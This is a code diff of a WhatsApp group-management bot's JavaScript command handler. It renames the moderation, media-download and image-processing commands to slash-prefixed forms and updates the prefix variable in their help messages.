-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
+  case '/antilinkyoutubevideo': case '/antilinkyoutubevid': case '/antilinkytvid': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2466,11 +2467,11 @@ ntilinkytvid.splice(off, 1)
 fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
 replygcZero('Success in turning off youtube video antilink in this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
+    case '/antilinkyoutubech': case '/antilinkyoutubechannel': case '/antilinkytch': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2493,11 +2494,11 @@ fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch
 ntilinkytch.splice(off, 1)
 replygcZero('Success in turning off youtube channel antilink in this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
+      case '/antilinkinstagram': case '/antilinkig': case '/antilinkinsta': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2520,11 +2521,11 @@ ntilinkig.splice(off, 1)
 fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
 replygcZero('Success in turning off instagram antilink in this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-        case 'antilinkfacebook': case 'antilinkfb': {
+        case '/antilinkfacebook': case '/antilinkfb': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2547,11 +2548,11 @@ ntilinkfb.splice(off, 1)
 fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
 replygcZero('Success in turning off facebook antilink in this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-          case 'antilinktelegram': case 'antilinktg': {
+          case '/antilinktelegram': case '/antilinktg': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2574,11 +2575,11 @@ ntilinktg.splice(off, 1)
 fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
 replygcZero('Success in turning off telegram antilink in this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-            case 'antilinktiktok': case 'antilinktt': {
+            case '/antilinktiktok': case '/antilinktt': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2601,11 +2602,11 @@ ntilinktt.splice(off, 1)
 fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
 replygcZero('Success in turning off tiktok antilink in this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
+            case '/antilinktwt': case '/antilinktwitter': case '/antilinktwit': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2628,11 +2629,11 @@ ntilinktwt.splice(off, 1)
 fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
 replygcZero('Success in turning off twitter antilink in this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-              case 'antilinkall': {
+              case '/antilinkall': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2655,11 +2656,11 @@ ntilinkall.splice(off, 1)
 fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
 replygcZero('Success in turning off all antilink in this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-case 'antitoxic': case 'antibadword': {
+case '/antitoxic': case '/antibadword': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2682,11 +2683,11 @@ nttoxic.splice(off, 1)
 fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
 replygcZero('Success in turning off antitoxic in this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-case 'antiwame': {
+case '/antiwame': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2709,11 +2710,11 @@ ntwame.splice(off, 1)
 fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
 replygcZero('Success in turning off antiwame in this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-case 'antilinkgc': {
+case '/antilinkgc': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2736,17 +2737,17 @@ ntlinkgc.splice(off, 1)
 fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
 replygcZero('Success in turning off antiwame in this group')
 } else {
-await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-   case 'leavegc': {
+   case '/leavegc': {
                 if (!ZeroTheCreator) return ZeroStickOwner()
                 await client.groupLeave(m.chat)
                 await replygcZero(`Done`)
             }
             break
-case 'add': {
+case '/add': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!ZeroTheCreator) return ZeroStickOwner()
@@ -2755,7 +2756,7 @@ await client.groupParticipantsUpdate(m.chat, [users], 'add')
 await replygcZero(`Done`)
 }
 break
-case 'closetime': {
+case '/closetime': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
@@ -2779,7 +2780,7 @@ replygcZero(close)
 }, timer)
 }
 break
-           case 'ephemeral': {
+           case '/ephemeral': {
                 if (!m.isGroup) return ZeroStickGroup()
                 if (!isBotAdmins) return ZeroStickBotAdmin()
                 if (!isAdmins) return ZeroStickAdmin()
@@ -2792,21 +2793,21 @@ break
                 }
             }
             break
-            case 'delete': case 'del': {
+            case '/delete': case '/del': {
                 if (!m.quoted) throw false
                 let { chat, fromMe, id, isBaileys } = m.quoted
                 if (!isBaileys) return replygcZero('The message was not sent by a bot!')
                  client.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
             }
             break
-            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
+            case '/linkgroup': case '/linkgc': case '/gclink': case '/grouplink': {
                 if (!m.isGroup) return ZeroStickGroup()
                 if (!isBotAdmins) return ZeroStickBotAdmin()
                 let response = await client.groupInviteCode(m.chat)
                 client.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
             }
             break
-case 'opentime': {
+case '/opentime': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
@@ -2830,7 +2831,7 @@ replygcZero(open)
 }, timer)
 }
 break
-case 'kick': {
+case '/kick': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
@@ -2839,21 +2840,21 @@ await client.groupParticipantsUpdate(m.chat, [users], 'remove')
 await replygcZero(`Done`)
 }
 break
-case 'setbotname':{
+case '/setbotname':{
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!text) return replygcZero(`Where is the name?\nExample: ${prefix + command} Zero`)
+if (!text) return replygcZero(`Where is the name?\nExample: ${prefixo + command} Zero`)
     await client.updateProfileName(text)
     replygcZero(`Success in changing the name of bot's number`)
     }
     break
-case 'setbotbio':{
+case '/setbotbio':{
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!text) return replygcZero(`Where is the text?\nExample: ${prefix + command} Zero`)
+if (!text) return replygcZero(`Where is the text?\nExample: ${prefixo + command} Zero`)
     await client.updateProfileStatus(text)
     replygcZero(`Success in changing the bio of bot's number`)
     }
     break
-    case 'setgroupname': case 'setsubject': {
+    case '/setgroupname': case '/setsubject': {
                 if (!m.isGroup) return ZeroStickGroup()
                 if (!isBotAdmins) return ZeroStickBotAdmin()
                 if (!isAdmins) return ZeroStickAdmin()
@@ -2862,7 +2863,7 @@ if (!text) return replygcZero(`Where is the text?\nExample: ${prefix + command} 
                 await replygcZero(`Done`)
             }
             break
-          case 'setdesc': case 'setdesk': {
+          case '/setdesc': case '/setdesk': {
                 if (!m.isGroup) return ZeroStickGroup()
                 if (!isBotAdmins) return ZeroStickBotAdmin()
                 if (!isAdmins) return ZeroStickAdmin()
@@ -2871,13 +2872,13 @@ if (!text) return replygcZero(`Where is the text?\nExample: ${prefix + command} 
                 await replygcZero(`Done`)
             }
             break
-case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
+case '/setppgroup': case '/setgcpp': case '/setgrouppp': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!quoted) return replygcZero(`Where is the picture?`)
-if (!/image/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefix + command}`)
-if (/webp/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefix + command}`)
+if (!/image/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefixo + command}`)
+if (/webp/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefixo + command}`)
 var mediz = await client.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
 if (args[0] == `full`) {
 var { img } = await generateProfilePicture(mediz)
@@ -2905,20 +2906,20 @@ replygcZero(`Success`)
 }
 }
 break
-case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
+case '/deleteppgroup': case '/delppgc': case '/deleteppgc': case '/delppgroup': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
     await client.removeProfilePicture(from)
     }
     break
-case 'deleteppbot': case 'delppbot': {
+case '/deleteppbot': case '/delppbot': {
 if (!ZeroTheCreator) return ZeroStickOwner()
     await client.removeProfilePicture(client.user.id)
     replygcZero(`Success in deleting bot's profile picture`)
     }
     break
-case 'promote': {
+case '/promote': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
@@ -2927,7 +2928,7 @@ await client.groupParticipantsUpdate(m.chat, [users], 'promote')
 await replygcZero(`Done`)
 }
 break
-case 'demote': {
+case '/demote': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
@@ -2936,23 +2937,23 @@ await client.groupParticipantsUpdate(m.chat, [users], 'demote')
 await replygcZero(`Done`)
 }
 break
-case 'hidetag': {
+case '/hidetag': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 client.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
 }
 break
-case 'totag': {
+case '/totag': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
-               if (!m.quoted) return replygcZero(`Reply message with caption ${prefix + command}`)
+               if (!m.quoted) return replygcZero(`Reply message with caption ${prefixo + command}`)
                client.sendMessage(from, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
                }
                break
 
-case 'tagall': {
+case '/tagall': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
@@ -2967,25 +2968,25 @@ teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
 client.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
 }
 break
-case 'ebinary': {
-if (!q) return replygcZero(`Send/reply text with captions ${prefix + command}`)
+case '/ebinary': {
+if (!q) return replygcZero(`Send/reply text with captions ${prefixo + command}`)
 ZeroStickWait()
 let { eBinary } = require('./scrape/binary')
 let eb = await eBinary(`${q}`)
 replygcZero(eb)
 }
 break
-case 'dbinary': {
-if (!q) return replygcZero(`Send/reply text with captions ${prefix + command}`)
+case '/dbinary': {
+if (!q) return replygcZero(`Send/reply text with captions ${prefixo + command}`)
 ZeroStickWait()
 let { dBinary } = require('./scrape/binary')
 let db = await dBinary(`${q}`)
 replygcZero(db)
 }
 break
-case 'remini': {
+case '/remini': {
 			if (!quoted) return replygcZero(`Where is the picture?`)
-			if (!/image/.test(mime)) return replygcZero(`Send/Reply Photos With Captions ${prefix + command}`)
+			if (!/image/.test(mime)) return replygcZero(`Send/Reply Photos With Captions ${prefixo + command}`)
 			ZeroStickWait()
 			const { remini } = require('./lib/remini')
 			let media = await quoted.download()
@@ -2993,7 +2994,7 @@ case 'remini': {
 			client.sendMessage(from, { image: proses, caption: mess.success}, { quoted: m})
 			}
 			break
-            case 'hi':{
+            case '/hi':{
                 let pushName = m.pushName || "NO name";
                 if(m.quoted){
                     const nme= await client.username(m.quoted.sender)
@@ -3005,14 +3006,14 @@ case 'remini': {
                 }
             }
             break
-case 'chatgpt':{
+case '/chatgpt':{
     if (!text) return m.reply ('*Please provide a query*')          
 let tioress22 = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=SGWN&text=${text}&user=zero`)
 let hasill22 = await tioress22.json()
 client.sendMessage(from, { text: `${hasill22.result}`.trim() }, { quoted: m });
 }
 break	
-case 'dalle':{
+case '/dalle':{
     if (!text) return m.reply ('*Please provide a query*')
     let wife = `https://api.lolhuman.xyz/api/dall-e?apikey=SGWN&text=${text}`;
     client.sendMessage(
@@ -3024,10 +3025,10 @@ case 'dalle':{
         );
 }		
 break
-case 'dehaze':{
+case '/dehaze':{
     let q = m.quoted ? m.quoted : m
     let mime = (q.msg || q).mimetype || q.mediaType || ""
-    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefix + command}!`)
+    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefixo + command}!`)
     await m.reply("wait")
     let data = await client.downloadAndSaveMediaMessage(quoted)
     let image = await TelegraPh(data)
@@ -3043,10 +3044,10 @@ case 'dehaze':{
             }
           );})}
 break
-case 'enhance':{
+case '/enhance':{
     let q = m.quoted ? m.quoted : m
     let mime = (q.msg || q).mimetype || q.mediaType || ""
-    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefix + command}!`)
+    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefixo + command}!`)
     await m.reply("wait")
     let data = await client.downloadAndSaveMediaMessage(quoted)
     let image = await TelegraPh(data)
@@ -3063,10 +3064,10 @@ case 'enhance':{
             );});
 }
 break
-case 'recolor':{
+case '/recolor':{
     let q = m.quoted ? m.quoted : m
     let mime = (q.msg || q).mimetype || q.mediaType || ""
-    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefix + command}!`)
+    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefixo + command}!`)
     await m.reply("wait")
     let data = await client.downloadAndSaveMediaMessage(quoted)
     let image = await TelegraPh(data)
@@ -3083,10 +3084,10 @@ case 'recolor':{
             );});
 }
 break
-case 'toanime':{
+case '/toanime':{
     let q = m.quoted ? m.quoted : m
     let mime = (q.msg || q).mimetype || q.mediaType || ""
-    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefix + command}!`)
+    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefixo + command}!`)
     await m.reply("wait")
     let data = await client.downloadAndSaveMediaMessage(quoted)
     let image = await TelegraPh(data)
@@ -3100,7 +3101,7 @@ case 'toanime':{
             }
           );}
 break
-case 'define':{
+case '/define':{
     if (!text)  return m.reply(`*Please provide an element name*`) 
         bro = await axios.get(`https://api.popcat.xyz/periodic-table?element=${text}`)
         let lol = "";
@@ -3112,8 +3113,8 @@ case 'define':{
         await client.sendMessage(from,{image:{url:bro.data.image},caption:lol},{quoted:m}) 
 }
 break
-case 'gimage': {
-                if (!text) return replygcZero(`Example : ${prefix + command} carry minati`)
+case '/gimage': {
+                if (!text) return replygcZero(`Example : ${prefixo + command} carry minati`)
                 ZeroStickWait()
                 let gis = require('g-i-s')
                 gis(text, async (error, result) => {
@@ -3122,9 +3123,9 @@ case 'gimage': {
                     client.sendMessage(from, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
                 })
             }
-            case 'gimage': {
+            case '/gimage': {
 
-       if (!text) return replygcZero(`Example : ${prefix + command} kaori cicak`
+       if (!text) return replygcZero(`Example : ${prefixo + command} kaori cicak`
 )
         Zeroezyanu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)
 
@@ -3137,7 +3138,7 @@ case 'gimage': {
         }
 
         break
-			case 'mediafire': {
+			case '/mediafire': {
 	if (args.length == 0) return replygcZero(`Where is the link ?`)
 	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygcZero(`The link you provided is invalid`)
 	const { mediafireDl } = require('./lib/mediafire.js')
@@ -3153,8 +3154,8 @@ replygcZero(`${result4}`)
 client.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
 }
 break
-case 'tiktokxx':{ 
-if (!text) return replygcZero( `Example : ${prefix + command} link`)
+case '/tiktokxx':{ 
+if (!text) return replygcZero( `Example : ${prefixo + command} link`)
 if (!q.includes('tiktok')) return replygcZero(`Link Invalid!!`)
 ZeroStickWait()
 require('./lib/tiktok').Tiktok(q).then( data => {
@@ -3162,8 +3163,8 @@ client.sendMessage(from, { caption: `Here you go!`, video: { url: data.watermark
 })
 }
 break
-case 'tiktokaudioxx':{
-if (!text) return replygcZero( `Example : ${prefix + command} link`)
+case '/tiktokaudioxx':{
+if (!text) return replygcZero( `Example : ${prefixo + command} link`)
 if (!q.includes('tiktok')) return replygcZero(`Link Invalid!!`)
 ZeroStickWait()
 require('./lib/tiktok').Tiktok(q).then( data => {
@@ -3171,8 +3172,8 @@ client.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, 
 })
 }
 break
-case 'google': {
-if (!q) return replygcZero(`Example : ${prefix + command} ${botname}`)
+case '/google': {
+if (!q) return replygcZero(`Example : ${prefixo + command} ${botname}`)
 ZeroStickWait()
 let google = require('google-it')
 google({'query': text}).then(res => {
@@ -3186,16 +3187,16 @@ replygcZero(teks)
 })
 }
 break
-case 'happymod':{
-if (!q) return replygcZero(`Example ${prefix+command} Sufway surfer mod`)
+case '/happymod':{
+if (!q) return replygcZero(`Example ${prefixo+command} Sufway surfer mod`)
 ZeroStickWait()
 let kat = await scp1.happymod(q)
 replygcZero(util.format(kat))
 }
 break
-case 'search':
-case 'yts': case 'ytsearch': {
-                if (!text) return replygcZero(`Example : ${prefix + command} story wa anime`)
+case '/search':
+case '/yts': case '/ytsearch': {
+                if (!text) return replygcZero(`Example : ${prefixo + command} story wa anime`)
                 let yts = require("yt-search")
                 let search = await yts(text)
                 let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
@@ -3206,8 +3207,8 @@ case 'yts': case 'ytsearch': {
                 client.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
             }
             break
-case 'xxxxplay':{
-if (!text) return replygcZero(`Example : ${prefix+command} story wa anime`)
+case '/xxxxplay':{
+if (!text) return replygcZero(`Example : ${prefixo+command} story wa anime`)
 ZeroStickWait()
 let search = await yts(text)
 url = search.videos[0].url
@@ -3228,8 +3229,8 @@ Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for v
 client.sendMessage(from, { image : eek, caption: ngen }, { quoted: m})
 }
 break
-case 'play':  case 'song': {
-if (!text) return replygcZero(`Example : ${prefix + command} anime whatsapp status`)
+case '/play':  case '/song': {
+if (!text) return replygcZero(`Example : ${prefixo + command} anime whatsapp status`)
 const Zeroplaymp3 = require('./lib/ytdl2')
 let yts = require("youtube-yts")
         let search = await yts(text)
@@ -3253,9 +3254,9 @@ await client.sendMessage(from,{
 await fs.unlinkSync(pl.path)
 }
 break
-case "ytmp3": case "ytaudio": //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
+case "/ytmp3": case "/ytaudio": //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
 const Zeroaudp3 = require('./lib/ytdl2')
-if (args.length < 1 || !isUrl(text) || !Zeroaudp3.isYTUrl(text)) return replygcZero(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
+if (args.length < 1 || !isUrl(text) || !Zeroaudp3.isYTUrl(text)) return replygcZero(`Where's the yt link?\nExample: ${prefixo + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
 const audio=await Zeroaudp3.mp3(text)
 await client.sendMessage(from,{
     audio: fs.readFileSync(audio.path),
@@ -3273,9 +3274,9 @@ await client.sendMessage(from,{
 },{quoted:m})
 await fs.unlinkSync(audio.path)
 break
-case 'ytmp4': case 'ytvideo': {
+case '/ytmp4': case '/ytvideo': {
 const Zerovidoh = require('./lib/ytdl2')
-if (args.length < 1 || !isUrl(text) || !Zerovidoh.isYTUrl(text)) replygcZero(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
+if (args.length < 1 || !isUrl(text) || !Zerovidoh.isYTUrl(text)) replygcZero(`Where is the link??\n\nExample : ${prefixo + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
 const vid=await Zerovidoh.mp4(text)
 const ytc=`
 *${themeemoji}Tittle:* ${vid.title}
@@ -3288,28 +3289,28 @@ await client.sendMessage(from,{
 },{quoted:m})
 }
 break
-case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
+case '/ytvxxx': case '/ytmp4xxx': case '/mp4xxx':{
 if (!text) return replygcZero('Enter the link!!!')
 ZeroStickWait()
 downloadMp4(text)
 }
 break
-case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
+case '/ytaxxx': case '/ytmp3xxx': case '/mp3xxx':{
 if (!text) return replygcZero('Enter the link!!!')
 ZeroStickWait()
 downloadMp3(text)
 }
 break  
-case 'getcase':
+case '/getcase':
 if (!ZeroTheCreator) return ZeroStickOwner()
 const getCase = (cases) => {
 return "case"+`'${cases}'`+fs.readFileSync("ZeroCheems7.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
 }
 replygcZero(`${getCase(q)}`)
 break
-case 'addprem':
+case '/addprem':
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!args[0]) return replygcZero(`Use ${prefix+command} number\nExample ${prefix+command} 917404854406`)
+if (!args[0]) return replygcZero(`Use ${prefixo+command} number\nExample ${prefixo+command} 917404854406`)
 prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 let ceknya = await client.onWhatsApp(prrkek)
 if (ceknya.length == 0) return replygcZero(`Enter a valid and registered number on WhatsApp!!!`)
@@ -3317,25 +3318,25 @@ prem.push(prrkek)
 fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
 replygcZero(`The Number ${prrkek} Has Been Premium!`)
 break
-case 'delprem':
+case '/delprem':
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!args[0]) return replygcZero(`Use ${prefix+command} nomor\nExample ${prefix+command} 917404854406`)
+if (!args[0]) return replygcZero(`Use ${prefixo+command} nomor\nExample ${prefixo+command} 917404854406`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 unp = prem.indexOf(ya)
 prem.splice(unp, 1)
 fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
 replygcZero(`The Number ${ya} Has Been Removed Premium!`)
 break
-case 'addbadword':{
+case '/addbadword':{
 if (!ZeroTheCreator) return ZeroStickOwner()
 if (args.length < 1) return replygcZero('Whats the word?')
 if (BadZero.includes(q)) return replygcZero("The word is already in use")
 BadZero.push(q)
 fs.writeFileSync('./database/bad.json', JSON.stringify(BadZero))
-replygcZero(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
+replygcZero(`Success Adding Bad Word\nCheck by typing ${prefixo}listbadword`)
 }
 break
-case 'delbadword':{
+case '/delbadword':{
 if (!ZeroTheCreator) return ZeroStickOwner()
 if (args.length < 1) return replygcZero('Enter the word')
 if (!BadZero.includes(q)) return replygcZero("The word does not exist in the database")
@@ -3345,7 +3346,7 @@ fs.writeFileSync('./database/bad.json', JSON.stringify(BadZero))
 replygcZero(`Success deleting bad word ${q}`)
 }
 break
-case 'listbadword':{
+case '/listbadword':{
 let teks = '┌──⭓「 *BadWord List* 」\n│\n'
 for (let x of BadZero) {
 teks += `│⭔ ${x}\n`
@@ -3354,7 +3355,7 @@ teks += `│\n└────────────⭓\n\n*Totally there are :
 replygcZero(teks)
 }
 break
-case 'addvideo':{
+case '/addvideo':{
 if (!ZeroTheCreator) return ZeroStickOwner()
 if (args.length < 1) return replygcZero('Whats the video name?')
 if (VideoZero.includes(q)) return replygcZero("The name is already in use")
@@ -3363,10 +3364,10 @@ VideoZero.push(q)
 await fsx.copy(delb, `./Media/video/${q}.mp4`)
 fs.writeFileSync('./Media/database/Zerovideo.json', JSON.stringify(VideoZero))
 fs.unlinkSync(delb)
-replygcZero(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
+replygcZero(`Success Adding Video\nCheck by typing ${prefixo}listvideo`)
 }
 break
-case 'delvideo':{
+case '/delvideo':{
 if (!ZeroTheCreator) return ZeroStickOwner()
 if (args.length < 1) return replygcZero('Enter the video name')
 if (!VideoZero.includes(q)) return replygcZero("The name does not exist in the database")
@@ -3377,7 +3378,7 @@ fs.unlinkSync(`./Media/video/${q}.mp4`)
